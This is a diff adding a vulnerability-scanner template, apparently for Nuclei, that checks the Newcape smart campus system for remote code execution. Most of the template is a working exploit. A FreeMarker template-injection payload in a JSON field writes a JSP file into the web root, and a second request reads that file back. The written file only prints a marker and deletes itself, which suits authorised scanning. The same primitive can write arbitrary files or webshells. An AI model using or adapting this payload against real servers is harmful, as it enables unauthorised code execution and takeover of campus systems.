@@ -1,0 +1,41 @@
+id: newcape-campus-system-service-rce
+
+info:
+  name: 新开普智慧校园系统 service.action 远程代码执行漏洞
+  author: SleepingBag945
+  severity: critical
+  description: |-
+    新开普智慧校园系统是一个校园管理平台。
+    新开普智慧校园系统存在代码执行漏洞，攻击者可通过该漏洞在服务器端执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  tags: newcape,rce
+
+variables:
+  rand2: "{{rand_base(5)}}"
+  randbody: "{{rand_base(28)}}"
+
+http:
+  - raw:
+      - |
+        POST /service_transport/service.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"command": "GetFZinfo", "UnitCode": "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.io.FileWriter\",\"./webapps/ROOT/{{rand2}}\").append(\"<% out.println(\\\"{{randbody}}\\\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\").close()}"}
+
+      - |
+        GET /{{rand2}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{randbody}}'
+        condition: and
+
+
+      - type: status
+        part: body_2
+        status:
+          - 200
